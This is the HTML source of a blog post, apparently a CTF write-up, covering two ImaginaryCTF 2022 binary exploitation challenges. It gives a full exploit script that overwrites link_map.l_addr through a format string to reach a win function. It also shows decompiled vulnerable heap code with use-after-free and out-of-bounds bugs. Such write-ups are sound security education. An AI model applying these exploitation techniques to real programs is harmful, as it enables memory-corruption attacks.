@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="CTF : https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1670Github : https:&#x2F;&#x2F;github.com&#x2F;4n0nym4u5&#x2F;CTF-Writeups&#x2F;tree&#x2F;main&#x2F;ImaginaryCTF-22  I played this CTF with Project Sekai and we came 3rd in this CTF. I solved Format Str">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Imaginary CTF 2022">
+<meta property="og:url" content="http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/index.html">
+<meta property="og:site_name" content="4n0nym4u5">
+<meta property="og:description" content="CTF : https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1670Github : https:&#x2F;&#x2F;github.com&#x2F;4n0nym4u5&#x2F;CTF-Writeups&#x2F;tree&#x2F;main&#x2F;ImaginaryCTF-22  I played this CTF with Project Sekai and we came 3rd in this CTF. I solved Format Str">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.imgur.com/Y0TASmG.png">
+<meta property="og:image" content="https://imgur.com/EwNKnIF.png">
+<meta property="og:image" content="https://imgur.com/ZoquUqm.png">
+<meta property="og:image" content="https://imgur.com/g2266Ga.png">
+<meta property="og:image" content="https://imgur.com/pQ8IcRD.png">
+<meta property="og:image" content="https://imgur.com/kdB332d.png">
+<meta property="og:image" content="https://imgur.com/VqLnTs2.png">
+<meta property="og:image" content="https://imgur.com/cGCtaKl.png">
+<meta property="article:published_time" content="2022-07-25T15:19:00.000Z">
+<meta property="article:modified_time" content="2023-02-01T17:27:24.934Z">
+<meta property="article:author" content="4n0nym4u5">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="fmt">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="libc-2.27">
+<meta property="article:tag" content="house-of-xxx">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/Y0TASmG.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Imaginary CTF 2022</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/02/01/test/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/05/10/San%20Diego%20CTF%202022/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/&text=Imaginary CTF 2022"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/&title=Imaginary CTF 2022"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/&is_video=false&description=Imaginary CTF 2022"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Imaginary CTF 2022&body=Check out this article: http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/&title=Imaginary CTF 2022"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/&title=Imaginary CTF 2022"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/&title=Imaginary CTF 2022"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/&title=Imaginary CTF 2022"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/&name=Imaginary CTF 2022&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/&t=Imaginary CTF 2022"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Format-String-Fun"><span class="toc-number">1.</span> <span class="toc-text">Format String Fun</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Checksec"><span class="toc-number">1.1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overview"><span class="toc-number">1.2.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bug"><span class="toc-number">1.3.</span> <span class="toc-text">Bug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">1.4.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#minecraft"><span class="toc-number">2.</span> <span class="toc-text">minecraft</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Checksec-1"><span class="toc-number">2.1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overview-1"><span class="toc-number">2.2.</span> <span class="toc-text">Overview</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#place-a-block"><span class="toc-number">2.2.1.</span> <span class="toc-text">place a block</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#break-a-block"><span class="toc-number">2.2.2.</span> <span class="toc-text">break a block</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#replace-a-block"><span class="toc-number">2.2.3.</span> <span class="toc-text">replace a block</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#leak-the-end-poem"><span class="toc-number">2.2.4.</span> <span class="toc-text">leak the end poem</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bug-1"><span class="toc-number">2.3.</span> <span class="toc-text">Bug</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Unintended-bug"><span class="toc-number">2.3.1.</span> <span class="toc-text">Unintended bug</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#House-of-Husk"><span class="toc-number">2.4.</span> <span class="toc-text">House of Husk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-stages"><span class="toc-number">2.5.</span> <span class="toc-text">Exploit stages</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">3.</span> <span class="toc-text">References</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Imaginary CTF 2022
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">4n0nym4u5</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-07-25T15:19:00.000Z" itemprop="datePublished">2022-07-25</time>
+        
+        (Updated: <time datetime="2023-02-01T17:27:24.934Z" itemprop="dateModified">2023-02-01</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/fmt/" rel="tag">fmt</a>, <a class="tag-link-link" href="/tags/heap/" rel="tag">heap</a>, <a class="tag-link-link" href="/tags/house-of-xxx/" rel="tag">house-of-xxx</a>, <a class="tag-link-link" href="/tags/libc-2-27/" rel="tag">libc-2.27</a>, <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>CTF : <a target="_blank" rel="noopener" href="https://ctftime.org/event/1670">https://ctftime.org/event/1670</a><br>Github : <a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5/CTF-Writeups/tree/main/IncognitoCTF-22"></a><a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5/CTF-Writeups/tree/main/ImaginaryCTF-22">https://github.com/4n0nym4u5/CTF-Writeups/tree/main/ImaginaryCTF-22</a></p>
+</blockquote>
+<p>I played this CTF with <strong><a target="_blank" rel="noopener" href="https://ctftime.org/team/169557">Project Sekai</a></strong> and we came 3rd in this CTF. I solved <code>Format String Fun</code>, <code>minecraft</code>, <code>zookeeper</code> with my team. </p>
+<p><img src="https://i.imgur.com/Y0TASmG.png"></p>
+<hr>
+<h2 id="Format-String-Fun"><a href="#Format-String-Fun" class="headerlink" title="Format String Fun"></a>Format String Fun</h2><blockquote>
+<p><strong>Description</strong> : One format string to rule them all, one format string to find them. One format string to bring them all, and in the darkness bind them.<br><strong>Challenge File</strong> : <a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5/CTF-Writeups/raw/main/IncognitoCTF-22/fmt_fun/chall">chall</a> <br><strong>Libc File</strong> : <a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5/CTF-Writeups/raw/main/IncognitoCTF-22/fmt_fun/libc.so.6">libc.so.6</a><br><strong>LD File</strong> : <a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5/CTF-Writeups/raw/main/IncognitoCTF-22/fmt_fun/ld-2.31.so">ld.so.6</a><br> <strong>Exploit :</strong> <a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5/CTF-Writeups/blob/main/IncognitoCTF-22/fmt_fun/expl.py">expl.py</a><br> <strong>Solves</strong> : 18<br><strong>Points</strong> : 474</p>
+</blockquote>
+<h3 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Full</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x3ff000)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p><img src="https://imgur.com/EwNKnIF.png"><br>The main function takes a 400 bytes of input from stdin and stores it in <code>buf</code> which is a global buffer residing in the bss section. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000404040 ; char buf[400]</span><br><span class="line">.bss:0000000000404040 buf  </span><br></pre></td></tr></table></figure>
+
+<p>The binary also has a <code>win</code> function that will print out the contents of the flag<br><img src="https://imgur.com/ZoquUqm.png"></p>
+<h3 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h3><p>The main function has a obvious format string bug.</p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>There is a format string bug in the main function and after the bug the binary calls exit function.</p>
+<p>✖️ You don’t have any libc leaks so you cannot overwrite any hooks.<br>✖️ Binary has full RELRO so you cannot overwrite GOT or <code>_fini_array</code>.</p>
+<p>I used a trick to redirect code execution from exit to call a function in the bss.<br>If you look closely on the stack layout you will see a linker address like this when you run <code>telescope</code> command in pwndbg.<br> <img src="https://imgur.com/g2266Ga.png"><br>I didn’t have an explanation on how overwriting this address can get me RIP control. I tried to debug the binary but i still couldn’t figure it out. The binary calls <code>exit -&gt; __run_exit_handlers -&gt; __call_tls_dtors</code><br>. After the CTF the author said </p>
+<blockquote>
+<p>edit link_map.l_addr to cause miscalulation of fini_array location</p>
+</blockquote>
+<p>and provided a link to a <a target="_blank" rel="noopener" href="https://activities.tjhsst.edu/csc/writeups/angstromctf-2021-wallstreet#writing-to-struct-link_map">writeup</a>. The exploit is explained very well here. The address we overwrite here is called the <code>l_addr</code>. So we overwrite the <code>l_addr</code> to cause a miscalculation of <code>fini_array</code> location when the exit happens and turn it into the address of our input in global buffer. So now we have the primitive to jump to any address or function. Remember there is a <code>win</code> function in the binary :)). </p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">address</span> <span class="string">of</span> <span class="string">buf</span> <span class="string">variable</span> <span class="string">:=</span> <span class="number">0x404040</span></span><br><span class="line"><span class="string">address</span> <span class="string">of</span> <span class="string">_fini_array</span>  <span class="string">:=</span> <span class="number">0x403db8</span></span><br><span class="line"><span class="string">distance</span> <span class="string">between</span> <span class="string">_fini_array</span> <span class="string">to</span> <span class="string">buf</span> <span class="string">:=</span> <span class="number">0x288</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><figcaption><span>expl.py</span><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/4n0nym4u5/CTF-Writeups/main/ImaginaryCTF-22/fmt_fun/expl.py">expl.py</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author := 4n0nym4u5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> rootkit <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">exe = context.binary = ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">host = args.HOST <span class="keyword">or</span> <span class="string">&quot;fmt-fun.chal.imaginaryctf.org&quot;</span></span><br><span class="line">port = <span class="built_in">int</span>(args.PORT <span class="keyword">or</span> <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">tbreak main</span></span><br><span class="line"><span class="string">b *win</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">    **<span class="built_in">locals</span>()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">libc = SetupLibcELF()</span><br><span class="line">io = start()</span><br><span class="line">fini_addr = <span class="number">0x403DB8</span></span><br><span class="line">buf = <span class="number">0x404040</span></span><br><span class="line">payload = <span class="string">f&quot;%<span class="subst">&#123;buf-fini_addr+<span class="number">0x10</span>&#125;</span>c%26$n&quot;</span>.encode(<span class="string">&quot;latin-1&quot;</span>).ljust(<span class="number">0x10</span>, <span class="string">b&quot;\x00&quot;</span>) + p(exe.sym.win) <span class="comment"># +0x10 to skip our format string payload and jump to win function</span></span><br><span class="line">sl(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><a name="minecraft"> </a></p>
+<hr>
+<h2 id="minecraft"><a href="#minecraft" class="headerlink" title="minecraft"></a>minecraft</h2><blockquote>
+<p><strong>Description</strong> : Blocks, chunks, same thing.<br><br><strong>Challenge File</strong> : <a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5/CTF-Writeups/raw/main/IncognitoCTF-22/minecraft/vuln">chall</a> <br><strong>Libc File</strong> : libc.so.6<br><strong>LD File</strong> : <a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5/CTF-Writeups/raw/main/IncognitoCTF-22/minecraft/ld-2.27.so">ld.so.6</a><br> <strong>Exploit :</strong> <a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5/CTF-Writeups/blob/main/IncognitoCTF-22/minecraft/expl.py">expl.py</a><br><br><strong>Solves</strong> : 8<br><br><strong>Points</strong> : 495<br></p>
+</blockquote>
+<h3 id="Checksec-1"><a href="#Checksec-1" class="headerlink" title="Checksec"></a>Checksec</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Full</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x3fd000)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h3><p>minecraft was a heap challenge. Libc version 2.27. The binary had 4 functionalities.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(p)lace a block</span><br><span class="line">(b)reak a block</span><br><span class="line">(r)eplace a block</span><br><span class="line">(l)eak the end poem     </span><br></pre></td></tr></table></figure>
+
+<h4 id="place-a-block"><a href="#place-a-block" class="headerlink" title="place a block"></a>place a block</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (choice == <span class="string">&#x27;p&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d%*c&quot;</span>, &amp; idx);</span><br><span class="line">    <span class="keyword">if</span> (idx &gt;= <span class="number">0x11</span>)</span><br><span class="line">        _Exit(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;len: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%ld%*c&quot;</span>, &amp; sizes[idx]);</span><br><span class="line">    <span class="keyword">if</span> (sizes[idx] &lt;= <span class="number">0x4FF</span> || sizes[idx] &gt; <span class="number">65536</span>)</span><br><span class="line">        _Exit(<span class="number">0</span>);</span><br><span class="line">    mem[idx] = <span class="built_in">malloc</span>(sizes[idx]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;type of block: &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (idx &gt;= <span class="number">0x11</span>)</span><br><span class="line">        _Exit(<span class="number">0</span>);</span><br><span class="line">    read(<span class="number">0</span>, mem[idx], sizes[idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>You can allocate chunks with malloc and the sizes are restricted not to use tcache sized blocks. The freed chunks goes into unsorted bins or large bins. No negative indexing bugs here.</p>
+<h4 id="break-a-block"><a href="#break-a-block" class="headerlink" title="break a block"></a>break a block</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (choice == <span class="string">&#x27;b&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d%*c&quot;</span>, &amp; idx);</span><br><span class="line">    <span class="keyword">if</span> (idx &gt;= <span class="number">0x11</span>)</span><br><span class="line">        _Exit(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(mem[idx]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;keep in inventory? &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%c%*c&quot;</span>, &amp; choice);</span><br><span class="line">    <span class="keyword">if</span> (choice != <span class="string">&#x27;y&#x27;</span> || kept) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Inventory full!&quot;</span>);</span><br><span class="line">        mem[idx] = <span class="number">0</span> LL;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ++kept;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>You can free chunks using this option.  if choice &#x3D;&#x3D; “n” <code>mem[idx]</code> is not nulled out so you can cause a UAF but just once. The <code>kept</code> variable is a global variable. If it is set you cannot trigger UAF again, you can use only once.</p>
+<h4 id="replace-a-block"><a href="#replace-a-block" class="headerlink" title="replace a block"></a>replace a block</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (choice == <span class="string">&#x27;r&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Careful... you can replace a block once.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (replaced)</span><br><span class="line">        _Exit(<span class="number">0</span>);</span><br><span class="line">    ++replaced;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d%*c&quot;</span>, &amp; idx);</span><br><span class="line">    <span class="keyword">if</span> (idx &gt;= <span class="number">0x11</span>)</span><br><span class="line">        _Exit(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;type of block: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, mem[idx], sizes[idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>You can edit the contents of the heap blocks using this option and you can do so only once. After you have used this option once the <code>replaced</code> variable is set and when you use it again the binary calls _Exit(0).</p>
+<h4 id="leak-the-end-poem"><a href="#leak-the-end-poem" class="headerlink" title="leak the end poem"></a>leak the end poem</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (choice == <span class="string">&#x27;l&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Careful... you can only leak the end poem once.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d%*c&quot;</span>, &amp; idx);</span><br><span class="line">    <span class="keyword">if</span> (idx &gt;= <span class="number">0x11</span>)</span><br><span class="line">        _Exit(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strchr</span>(mem[idx], <span class="string">&#x27;n&#x27;</span>))</span><br><span class="line">        _Exit(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(mem[idx]) &gt; <span class="number">9</span>)</span><br><span class="line">        _Exit(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(mem[idx]);</span><br><span class="line">    _Exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Using this option will exit the program. Right before the exit call there is a printf call without format string parameter (format string bug). But we cannot use this to write data because it checks if our input contains character “n” and our input is limited to only 9 bytes. We cannot use this function to get any leaks as the binary will just exit right afterwards. </p>
+<h3 id="Bug-1"><a href="#Bug-1" class="headerlink" title="Bug"></a>Bug</h3><p><code>(b)reak a block</code> option has a UAF vulnerability.<br><code>(r)eplace a block</code> option can be used to overwrite contents of a freed block (WAF primitive).<br><code>(l)eak the end poem</code> option has a format string vulnerability.</p>
+<h4 id="Unintended-bug"><a href="#Unintended-bug" class="headerlink" title="Unintended bug"></a>Unintended bug</h4><p>The <code>sizes</code> array is of length 16 and the binary allows you to create a chunk with index 16. So this chunk’s size field has an OOB and the size is written to the mem[0]. You can use this bug to get an heap overflow.</p>
+<ol>
+<li>Place a chunk (<strong>A</strong>) on index 16. </li>
+<li>Place a chunk (<strong>B</strong>) on index 0. </li>
+<li>Use the <code>(r)eplace a block</code> option to edit the contents of chunk <strong>B</strong> This will use th<br>address of chunk <strong>A</strong> as the length to read into chunk <strong>B</strong>.<br><img src="https://imgur.com/pQ8IcRD.png" alt="enter image description here"><br><img src="https://imgur.com/kdB332d.png" alt="enter image description here"></li>
+</ol>
